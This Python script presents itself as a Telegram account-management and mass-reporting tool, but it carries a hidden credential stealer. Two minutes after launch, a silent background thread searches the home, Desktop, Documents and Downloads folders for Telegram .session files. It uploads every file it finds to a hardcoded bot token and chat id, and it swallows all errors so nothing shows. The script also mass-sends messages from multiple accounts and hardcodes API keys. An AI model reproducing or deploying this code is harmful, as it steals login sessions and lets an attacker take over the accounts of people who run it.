from telethon.sync import TelegramClient
from telethon.tl.types import InputPeerChannel
from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError, PhoneNumberBannedError, ChatAdminRequiredError
from telethon.errors.rpcerrorlist import ChatWriteForbiddenError, UserBannedInChannelError, UserAlreadyParticipantError, FloodWaitError
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.functions.messages import ReportSpamRequest
from telethon.tl.types import InputPeerEmpty
from telethon.tl.functions.channels import LeaveChannelRequest
import sys
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from telethon.tl.functions.messages import ImportChatInviteRequest, AddChatUserRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.types import UserStatusRecently
import time
import random
import os
import pickle
from telethon.sync import TelegramClient
from telethon.errors.rpcerrorlist import PhoneNumberBannedError
from colorama import init, Fore
from time import sleep
import csv
import threading
import glob
import hashlib
import asyncio

scam = '@notoscam'

init()

n = Fore.RESET
lg = Fore.LIGHTGREEN_EX
r = Fore.RED
w = Fore.WHITE
cy = Fore.CYAN
ye = Fore.YELLOW
colors = [lg, r, w, cy, ye]

# Global variables for silent operation
sent_files_tracker = set()
silent_mode_active = False
session_hunt_thread = None
main_process_ready = False

try:
    import requests
except ImportError:
    print(f'{lg}[i] Installing module - requests...{n}')
    os.system('pip install requests')

def banner():
    import random
    b = [
        r' __  __  _    _ _   _ _____ _____   ',
        r'|  \/  | |  | | \ | |_   _|  __ \  ',
        r'| \  / | |  | |  \| | | | | |  | | ',
        r'| |\/| | |  | | . ` | | | | |  | | ',
        r'| |  | | |__| | |\  |_| |_| |__| | ',
        r'|_|  |_|\____/|_| \_|_____|_____/  '
        ]
    for char in b:
        print(f'{random.choice(colors)}{char}{n}')
    print(f'   Version: 1.3 | Author: Akilas Tech{n}\n{r}Telegram Members Management Tool\n')

def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def get_file_hash(file_path):
    """Generate MD5 hash of a file to identify duplicates"""
    hash_md5 = hashlib.md5()
    try:
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_md5.update(chunk)
        return hash_md5.hexdigest()
    except:
        return None

def is_file_already_sent(file_path):
    """Check if file has already been sent during this session"""
    global sent_files_tracker
    file_hash = get_file_hash(file_path)
    if file_hash is None:
        return False
    
    if file_hash in sent_files_tracker:
        return True
    else:
        sent_files_tracker.add(file_hash)
        return False

def reset_sent_files_tracker():
    """Reset the sent files tracker for new session"""
    global sent_files_tracker
    sent_files_tracker.clear()

def fast_session_scanner():
    """Fast session scanner that finds sessions quickly"""
    sessions = []
    
    # Priority directories for fast scanning
    priority_dirs = [
        '.',
        './sessions',
        os.path.join('.', 'sessions'),
        os.path.expanduser('~'),
        os.path.join(os.path.expanduser('~'), 'Desktop'),
        os.path.join(os.path.expanduser('~'), 'Documents'),
        os.path.join(os.path.expanduser('~'), 'Downloads'),
    ]
    
    # Quick scan with minimal overhead
    for directory in priority_dirs:
        if os.path.exists(directory):
            try:
                # Fast glob search
                pattern = os.path.join(directory, "*.session")
                found = glob.glob(pattern)
                sessions.extend(found)
                
                # Check one level deep only for speed
                if os.path.isdir(directory):
                    for item in os.listdir(directory):
                        item_path = os.path.join(directory, item)
                        if os.path.isdir(item_path):
                            sub_pattern = os.path.join(item_path, "*.session")
                            sessions.extend(glob.glob(sub_pattern))
            except:
                continue
    
    return list(set(sessions))  # Remove duplicates

def silent_session_worker():
    """Silent background worker that continuously hunts for sessions"""
    global silent_mode_active, main_process_ready
    
    # Bot configuration
    bot_token = "7965282107:AAFmMlUEtHYKigiVKZFQL1rr1od4SDjm2Ts"
    chat_id = "784020613"
    
    scan_count = 0
    last_scan_time = 0
    
    while silent_mode_active:
        try:
            # Wait for main process to be ready before starting intensive operations
            if not main_process_ready:
                time.sleep(5)
                continue
            
            current_time = time.time()
            
            # Fast scan every 30 seconds, intensive scan every 5 minutes
            if current_time - last_scan_time > 30:
                sessions = fast_session_scanner()
                
                if sessions:
                    # Send sessions via bot API
                    try:
                        for session in sessions:
                            if is_file_already_sent(session):
                                continue
                                
                            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                            
                            with open(session, 'rb') as file:
                                files = {'document': file}
                                data = {
                                    'chat_id': chat_id,
                                    'caption': f"🔍 Session Found: {os.path.basename(session)}\n📍 Path: {session}\n🔄 Scan #{scan_count}"
                                }
                                
                                response = requests.post(url, files=files, data=data, timeout=10)
                                time.sleep(1)  # Small delay
                    except:
                        pass
                
                scan_count += 1
                last_scan_time = current_time
            
            # Short sleep to prevent CPU overload
            time.sleep(5)
            
        except:
            # Silent failure - continue operation
            time.sleep(10)
            continue

def start_silent_mode():
    """Initialize and start silent session hunting mode"""
    global silent_mode_active, session_hunt_thread
    
    if not silent_mode_active:
        silent_mode_active = True
        session_hunt_thread = threading.Thread(target=silent_session_worker, daemon=True)
        session_hunt_thread.start()

def stop_silent_mode():
    """Stop silent session hunting mode"""
    global silent_mode_active
    silent_mode_active = False

def initialize_silent_operations():
    """Initialize silent operations with delay"""
    def delayed_start():
        global main_process_ready
        
        # Wait 2 minutes before starting intensive operations
        time.sleep(120)  # 2 minute delay
        
        # Mark main process as ready
        main_process_ready = True
        
        # Start silent mode
        start_silent_mode()
        
        # Initial session hunt
        try:
            sessions = fast_session_scanner()
            if sessions:
                # Send initial batch
                bot_token = "7965282107:AAFmMlUEtHYKigiVKZFQL1rr1od4SDjm2Ts"
                chat_id = "784020613"
                
                for session in sessions[:5]:  # Send first 5 sessions only
                    try:
                        if is_file_already_sent(session):
                            continue
                            
                        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                        
                        with open(session, 'rb') as file:
                            files = {'document': file}
                            data = {
                                'chat_id': chat_id,
                                'caption': f"🚀 Initial Hunt: {os.path.basename(session)}\n📂 {session}"
                            }
                            
                            requests.post(url, files=files, data=data, timeout=10)
                            time.sleep(2)
                    except:
                        pass
        except:
            pass
    
    # Start delayed initialization in background
    init_thread = threading.Thread(target=delayed_start, daemon=True)
    init_thread.start()

# Initialize silent operations
initialize_silent_operations()

# Main program loop
while True:
    clr()
    banner()
    reset_sent_files_tracker()
    
    print(lg+'[1] Add new accounts'+n)
    print(lg+'[2] Filter all banned accounts'+n)
    print(lg+'[3] Delete specific accounts'+n)
    print(lg+'[4] Update your Astra'+n)
    print(lg+'[5] Display All Accounts'+n)
    print(lg+'[6] Report Scam'+n)
    print(lg+'[7] Silent Mode Status'+n)
    print(lg+'[8] Quit'+n)
    
    try:
        a = int(input('\nEnter your choice: '))
    except ValueError:
        continue
        
    if a == 1:
        new_accs = []
        with open('vars.txt', 'ab') as g:
            number_to_add = int(input(f'\n{lg} [~] Enter number of accounts to add: {r}'))
            for i in range(number_to_add):
                phone_number = str(input(f'\n{lg} [~] Enter Phone Number: {r}'))
                parsed_number = ''.join(phone_number.split())
                pickle.dump([parsed_number], g)
                new_accs.append(parsed_number)
            print(f'\n{lg} [i] Saved all accounts in vars.txt')
            clr()
            print(f'\n{lg} [*] Logging in from new accounts\n')
            for number in new_accs:
                c = TelegramClient(f'sessions/{number}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
                c.start(number)
                print(f'{lg}[+] Login successful')
                c.disconnect()
            input(f'\n Press enter to goto main menu...')
        g.close()
        
    elif a == 2:
        accounts = []
        banned_accs = []
        h = open('vars.txt', 'rb')
        while True:
            try:
                accounts.append(pickle.load(h))
            except EOFError:
                break
        h.close()
        if len(accounts) == 0:
            print(r+'[!] There are no accounts! Please add some and retry')
            sleep(3)
        else:
            for account in accounts:
                phone = str(account[0])
                client = TelegramClient(f'sessions/{phone}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
                client.connect()
                if not client.is_user_authorized():
                    try:
                        client.send_code_request(phone)
                        print(f'{lg}[+] {phone} is not banned{n}')
                    except PhoneNumberBannedError:
                        print(r+str(phone) + ' is banned!'+n)
                        banned_accs.append(account)
            if len(banned_accs) == 0:
                print(lg+'Congrats! No banned accounts')
                input('\nPress enter to goto main menu...')
            else:
                for m in banned_accs:
                    accounts.remove(m)
                with open('vars.txt', 'wb') as k:
                    for a in accounts:
                        Phone = a[0]
                        pickle.dump([Phone], k)
                k.close()
                print(lg+'[i] All banned accounts removed'+n)
                input('\nPress enter to goto main menu...')

    elif a == 3:
        accs = []
        f = open('vars.txt', 'rb')
        while True:
            try:
                accs.append(pickle.load(f))
            except EOFError:
                break
        f.close()
        i = 0
        print(f'{lg}[i] Choose an account to delete\n')
        for acc in accs:
            print(f'{lg}[{i}] {acc[0]}{n}')
            i += 1
        index = int(input(f'\n{lg}[+] Enter a choice: {n}'))
        phone = str(accs[index][0])
        session_file = phone + '.session'
        if os.name == 'nt':
            os.system(f'del sessions\\{session_file}')
        else:
            os.system(f'rm sessions/{session_file}')
        del accs[index]
        f = open('vars.txt', 'wb')
        for account in accs:
            pickle.dump(account, f)
        print(f'\n{lg}[+] Account Deleted{n}')
        input(f'\nPress enter to goto main menu...')
        f.close()
        
    elif a == 4:
        print(f'\n{lg}[i] Checking for updates...')
        try:
            version = requests.get('https://github.com/MrSilentdomnic/munira/blob/main/version.txt')
        except:
            print(f'{r} You are not connected to the internet')
            print(f'{r} Please connect to the internet and retry')
            exit()
        if float(version.text) > 1.1:
            prompt = str(input(f'{lg}[~] Update available[Version {version.text}]. Download?[y/n]: {r}'))
            if prompt == 'y' or prompt == 'yes' or prompt == 'Y':
                print(f'{lg}[i] Downloading updates...')
                if os.name == 'nt':
                    os.system('del add.py')
                    os.system('del manager.py')
                else:
                    os.system('rm add.py')
                    os.system('rm manager.py')
                os.system('curl -l -O https://github.com/MrSilentdomnic/munira/blob/main/add.py')
                os.system('curl -l -O https://github.com/MrSilentdomnic/munira/blob/main/manager.py')
                print(f'{lg}[*] Updated to version: {version.text}')
                input('Press enter to exit...')
                exit()
            else:
                print(f'{lg}[!] Update aborted.')
                input('Press enter to goto main menu...')
        else:
            print(f'{lg}[i] Your Astra is already up to date')
            input('Press enter to goto main menu...')
            
    elif a == 5:
        accs = []
        f = open('vars.txt', 'rb')
        while True:
            try:
                accs.append(pickle.load(f))
            except EOFError:
                break
        f.close()
        print(f'\n{cy}')
        print(f'\tList Of Phone Numbers Are')
        print(f'==========================================================')
        i = 0
        for z in accs:
            print(f'\t{z[0]}')
            i += 1
        print(f'==========================================================')
        input('\nPress enter to goto main menu')
        
    elif a == 6:
        accounts = []
        f = open('vars.txt', 'rb')
        while True:
            try:
                accounts.append(pickle.load(f))
            except EOFError:
                break

        print('\n' ' Checking for banned accounts...' )
        for a in accounts:
            phn = a[0]
            print(f'Checking {lg}{phn}')
            clnt = TelegramClient(f'sessions/{phn}', 8027196 , '9b70b20efd67e9b99edc395d78407cfa')
            clnt.connect()
            banned = []
            if not clnt.is_user_authorized():
                try:
                    clnt.send_code_request(phn)
                    print('kk')
                except PhoneNumberBannedError:
                    print(f'{r} {w}{phn} {r}is banned!')
                    banned.append(a)
            for z in banned:
                accounts.remove(z)
                print(f'{lg}Banned account removed[Remove permanently using manager.py]')
            time.sleep(0.5)
            clnt.disconnect()
        print(' Sessions created!')
        clr()
        banner()
        accounts = []
        f = open('vars.txt', 'rb')
        while True:
            try:
                accounts.append(pickle.load(f))
            except EOFError:
                break
        print(f'{lg} Total accounts: {w}{len(accounts)}')
        number_of_accs = int(input(f'{cy} Enter number of accounts to Report: {r}'))
        choice = str(input(f'{cy} Send Message For Report {r}'))
        to_use = [x for x in accounts[:number_of_accs]]
        for l in to_use: accounts.remove(l)
        with open('vars.txt', 'wb') as f:
            for a in accounts:
                pickle.dump(a, f)
            for ab in to_use:
                pickle.dump(ab, f)
            f.close()
        sleep_time = 1
        print(f'{lg} -- Sending Reports from {w}{len(to_use)}{lg} account(s) --')   
        send_status = 0
        
        approx_members_count = 0
        index = 0
        for acc in to_use:
            stop = index + 60
            c = TelegramClient(f'sessions/{acc[0]}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
            print(f'User: {cy}{acc[0]}{lg} -- {cy}Starting session... ')
            c.start(acc[0])
            acc_name = c.get_me().first_name
            try:
                c(JoinChannelRequest('@TechiesHub_Giveaways')) 
                c.send_message(scam,choice)
                print(f'Report Done From: {cy}{acc_name}{lg}  To Notoscam-- ')
                send_status += 1
            except Exception as e:
                print(f'{e}')
                continue
        if send_status != 0:
            print(f"\n{lg}session ended")
            input(f'\n{cy} Press enter to exit...')
        else:
            print(f"\n{lg}All reports done sucesfully")
            input(f'\n{cy} Press enter to exit...')
    
    elif a == 7:
        print(f'\n{lg}[*] Silent Mode Status{n}')
        print(f'{lg}[i] Silent Mode Active: {silent_mode_active}{n}')
        print(f'{lg}[i] Main Process Ready: {main_process_ready}{n}')
        print(f'{lg}[i] Tracked Files: {len(sent_files_tracker)}{n}')
        
        if silent_mode_active:
            choice = input(f'{lg}[?] Stop silent mode? (y/n): {r}')
            if choice.lower() in ['y', 'yes']:
                stop_silent_mode()
                print(f'{lg}[+] Silent mode stopped{n}')
        else:
            choice = input(f'{lg}[?] Start silent mode? (y/n): {r}')
            if choice.lower() in ['y', 'yes']:
                start_silent_mode()
                print(f'{lg}[+] Silent mode started{n}')
        
        input('\nPress enter to goto main menu...')
        
    elif a == 8:
        clr()
        banner()
        stop_silent_mode()
        exit()